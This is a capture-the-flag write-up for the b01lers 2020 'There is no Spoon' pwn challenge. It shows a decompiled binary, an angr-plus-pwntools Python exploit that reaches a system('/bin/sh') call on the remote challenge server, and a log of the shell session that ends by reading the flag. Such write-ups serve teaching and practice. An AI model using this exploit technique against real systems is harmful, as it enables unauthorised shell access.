# b01lers bootcamp CTF 2020

## There is no Spoon

> 100
>
> Neo: bend reality, and understand the truth of the matrix.
> 
> `nc chal.ctf.b01lers.com 1006`
> 
> [thereisnospoon](thereisnospoon)  
> [thereisnospoon.c](thereisnospoon.c)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _angr_


## Summary

I lazied my way out of this one and let [angr.io](angr.io) do all the work.  6 second solve.  Zero sweat.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Anything goes but shellcode.


### Decompile with Ghidra

```c
undefined8 main(void)
{
  ssize_t sVar1;
  size_t __size;
  char local_128 [256];
  long local_28;
  uint *local_20;
  void *local_18;
  int local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  local_c = 0x100;
  printf("Neo, enter your matrix: ");
  sVar1 = read(0,local_128,(long)local_c);
  local_c = (int)sVar1;
  __size = strlen(local_128);
  local_18 = malloc(__size);
  local_20 = (uint *)malloc(4);
  *local_20 = 0xff;
  printf("Reality: %d\n",(ulong)*local_20);
  printf("Make your choice: ");
  sVar1 = read(0,local_18,(long)local_c);
  local_c = (int)sVar1;
  puts("Now bend reality. Remember: there is no spoon.");
  local_28 = xor((long)local_18,(long)local_128,local_c);
  printf("Result: %s\n",local_28);
  printf("Reality: %d\n",(ulong)*local_20);
  if (*local_20 != 0xff) {
    system("/bin/sh");
  }
  return 0;
}
```

We just need to figure out the correct input to change `*local_20`, _or do we?_

> _Why are we looking at the decompile when the source was provided?_
> 
> Because we need to tell _angr_ what to search for:

```assembly
004013d2 e8 e9 fc        CALL       system
         ff ff
```

`0x4013d2` is our target.


## Exploit

```python
#!/usr/bin/env python3

import angr, time, io
from pwn import *

FIND_ADDR=0x4013d2
t=time.time()
bits = open('./thereisnospoon','rb').read()
proj = angr.Project(io.BytesIO(bits),auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
simgr.use_technique(angr.exploration_techniques.DFS())
simgr.explore(find=FIND_ADDR)
log.info(str(time.time() - t) + ' seconds')

binary = context.binary = ELF('./thereisnospoon')
context.log_level = 'INFO'

if not args.REMOTE:
    context.log_file = 'local.log'
    p = process(binary.path)
else:
    context.log_file = 'remote.log'
    p = remote('chal.ctf.b01lers.com', 1006)

p.send(simgr.found[0].posix.dumps(0))
p.interactive()
```

Not a lot here.  Set the find address to the address calling `system`, wait 6 seconds for _angr_ to do all the work for us, then just pass that along.


Output:

```bash
# ./exploit.py REMOTE=1
[*] 5.977146625518799 seconds
INFO    | 2020-10-04 21:05:10,983 | pwnlib.exploit | 5.977146625518799 seconds
[*] '/pwd/datajerk/b01lersbootcampctf2020/there_is_no_spoon/thereisnospoon'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
INFO    | 2020-10-04 21:05:11,041 | pwnlib.elf.elf | '/pwd/datajerk/b01lersbootcampctf2020/there_is_no_spoon/thereisnospoon'
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
[|] Opening connection to chal.ctf.b01lers.com on port 1006
INFO    | 2020-10-04 21:05:11,045 | pwnlib.tubes.remote.remote.140324877945632 | Opening connection to chal.ctf.b01lers.com Opening connection to chal.ctf.b01lers.com on port 1006: Trying 104.197.187.199
INFO    | 2020-10-04 21:05:11,100 | pwnlib.tubes.remote.remote.140324877945632 | Opening connection to chal.ctf.b01lers.[+] Opening connection to chal.ctf.b01lers.com on port 1006: Done
INFO    | 2020-10-04 21:05:11,169 | pwnlib.tubes.remote.remote.140324877945632 | Opening connection to chal.ctf.b01lers.com on port 1006: Done
[*] Switching to interactive mode
INFO    | 2020-10-04 21:05:11,171 | pwnlib.tubes.remote.remote.140324877945632 | Switching to interactive mode
Neo, enter your matrix: Reality: 255
Make your choice: Now bend reality. Remember: there is no spoon.
Result:
Reality: 0
$ id
uid=1000(strlenvsread) gid=1000(strlenvsread) groups=1000(strlenvsread)
$ ls -l
total 36
-r-xr-x--- 1 root strlenvsread    98 Oct  2 18:33 Makefile
-r--r----- 1 root strlenvsread    30 Oct  2 18:33 flag.txt
-r-xr-x--- 1 root strlenvsread 17056 Oct  3 04:08 strlenvsread
-r-xr-x--- 1 root strlenvsread   912 Oct  2 18:33 strlenvsread.c
-r-xr-x--- 1 root strlenvsread    53 Oct  2 18:33 wrapper.sh
$ cat flag.txt
flag{l0tz_0f_confUsi0n_vulnz}
```
